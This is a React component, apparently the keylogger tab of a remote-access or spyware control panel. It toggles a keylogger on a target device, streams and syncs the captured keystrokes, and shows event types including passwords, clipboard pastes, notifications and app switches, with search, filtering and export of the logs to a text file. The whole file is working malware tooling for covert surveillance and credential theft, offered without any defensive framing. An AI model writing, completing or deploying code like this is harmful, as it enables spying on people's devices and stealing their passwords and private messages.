import { useState, useEffect, useRef } from 'react';
import { subscribeType } from '../../lib/socket';

const TYPE_COLORS = {
  password:        '#f44',
  text:            '#ccc',
  clipboard_paste: '#f5a623',
  field_focus:     '#7b61ff',
  click:           '#555',
  notification:    '#61b3ff',
  app_switch:      '#444',
  screen_lock:     '#888',
  screen_unlock:   '#00d26a',
  screen_off:      '#333',
};

export default function KeylogTab({ device, send }) {
  const [entries,  setEntries]  = useState([]);
  const [filter,   setFilter]   = useState('');
  const [typeFilter, setType]   = useState('all');
  const [active,   setActive]   = useState(false);
  const [autoScroll, setAutoScroll] = useState(true);
  const bottomRef = useRef(null);

  useEffect(() => {
    const unsub = subscribeType(device.id, ['keylog', 'KEYLOG'], (msg) => {
      const batch = msg.keystrokes || msg.data?.keystrokes || [];
      if (batch.length) {
        setEntries(prev => [...prev, ...batch].slice(-2000));
      } else if (msg.text || msg.data) {
        // Single entry
        setEntries(prev => [...prev, msg].slice(-2000));
      }
    });
    return unsub;
  }, [device.id]);

  useEffect(() => {
    if (autoScroll && bottomRef.current) {
      bottomRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [entries, autoScroll]);

  const toggle = () => {
    const next = !active;
    setActive(next);
    send({ type: 'TOGGLE_KEYLOGGER', enabled: next });
  };

  const exportTxt = () => {
    const lines = filtered.map(e =>
      `[${new Date(e.timestamp).toLocaleTimeString()}] [${e.eventType||'text'}] [${e.packageName||''}] ${e.text||e.content||''}`
    ).join('\n');
    const blob = new URL('data:text/plain;charset=utf-8,' + encodeURIComponent(lines));
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([lines], { type: 'text/plain' }));
    a.download = `keylog_${device.id.slice(0,8)}_${Date.now()}.txt`;
    a.click();
  };

  const allTypes = ['all', ...new Set(entries.map(e => e.eventType || e.event_type || 'text').filter(Boolean))];

  const filtered = entries.filter(e => {
    const t = e.eventType || e.event_type || 'text';
    if (typeFilter !== 'all' && t !== typeFilter) return false;
    if (filter) {
      const txt = (e.text || e.content || e.packageName || '').toLowerCase();
      return txt.includes(filter.toLowerCase());
    }
    return true;
  });

  return (
    <div style={S.root}>
      <div style={S.bar}>
        <Btn onClick={toggle} active={active} color={active ? '#00d26a' : '#666'}>
          {active ? '⬤ LIVE' : '○ START'}
        </Btn>
        <Btn onClick={() => { send('SYNC_KEYLOGS'); }}>SYNC</Btn>
        <Btn onClick={() => setEntries([])} color="#f44">CLEAR</Btn>
        <Btn onClick={exportTxt} color="#7b61ff">EXPORT</Btn>
        <label style={S.autoScrollLabel}>
          <input type="checkbox" checked={autoScroll} onChange={e => setAutoScroll(e.target.checked)} />
          <span style={{ marginLeft: 4, fontSize: 11, color: '#555' }}>autoscroll</span>
        </label>
        <span style={{ marginLeft: 'auto', fontSize: 11, color: '#444' }}>{filtered.length} entries</span>
      </div>

      <div style={S.filters}>
        <input style={S.search} placeholder="Search…" value={filter}
          onChange={e => setFilter(e.target.value)} />
        <select style={S.sel} value={typeFilter} onChange={e => setType(e.target.value)}>
          {allTypes.map(t => <option key={t} value={t}>{t}</option>)}
        </select>
      </div>

      <div style={S.list}>
        {filtered.length === 0 && (
          <div style={S.empty}>
            {entries.length === 0
              ? 'No keylog data. Start keylogger and wait.'
              : 'No entries match filter.'}
          </div>
        )}
        {filtered.map((e, i) => {
          const type = e.eventType || e.event_type || 'text';
          const color = TYPE_COLORS[type] || '#888';
          const isPass = type === 'password';
          return (
            <div key={i} style={S.entry}>
              <span style={{ ...S.typeBadge, color, borderColor: color + '44' }}>{type}</span>
              <span style={{ ...S.entryText, color: isPass ? '#f44' : color }}>
                {isPass ? '●'.repeat(Math.min((e.text || '').length, 20)) + (e.text?.length > 20 ? '…' : '') : (e.text || e.content || '')}
              </span>
              <span style={S.pkg}>{e.packageName || e.package || ''}</span>
              <span style={S.ts}>{e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : ''}</span>
            </div>
          );
        })}
        <div ref={bottomRef} />
      </div>
    </div>
  );
}

function Btn({ onClick, active, color, children }) {
  const c = color || '#00d26a';
  return (
    <button onClick={onClick} style={{
      background: active ? c + '22' : 'transparent',
      border: `1px solid ${active ? c : '#222'}`,
      color: active ? c : '#666',
      fontSize: 11, padding: '4px 10px', borderRadius: 4,
      cursor: 'pointer', fontFamily: 'inherit',
    }}>{children}</button>
  );
}

const S = {
  root:    { display: 'flex', flexDirection: 'column', gap: 8, height: '100%', minHeight: 0 },
  bar:     { display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center', flexShrink: 0 },
  filters: { display: 'flex', gap: 8, flexShrink: 0 },
  search:  { flex: 1, background: '#0d0d18', border: '1px solid #1e1e2a',
             color: '#ccc', fontSize: 11, padding: '4px 8px', borderRadius: 4,
             outline: 'none', fontFamily: 'monospace' },
  sel:     { background: '#0d0d18', border: '1px solid #1e1e2a',
             color: '#888', fontSize: 11, padding: '4px 8px', borderRadius: 4,
             outline: 'none', fontFamily: 'monospace' },
  list:    { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column',
             gap: 2, fontFamily: 'monospace', fontSize: 11 },
  empty:   { color: '#333', textAlign: 'center', marginTop: 40, fontSize: 12 },
  entry:   { display: 'flex', alignItems: 'center', gap: 8, padding: '3px 6px',
             borderBottom: '1px solid #0f0f18', borderRadius: 3 },
  typeBadge: { fontSize: 9, border: '1px solid', padding: '1px 5px',
               borderRadius: 3, letterSpacing: .5, flexShrink: 0, minWidth: 60, textAlign: 'center' },
  entryText: { flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' },
  pkg:     { fontSize: 9, color: '#333', flexShrink: 0, maxWidth: 120,
             overflow: 'hidden', textOverflow: 'ellipsis' },
  ts:      { fontSize: 9, color: '#333', flexShrink: 0 },
  autoScrollLabel: { display: 'flex', alignItems: 'center', cursor: 'pointer' },
};
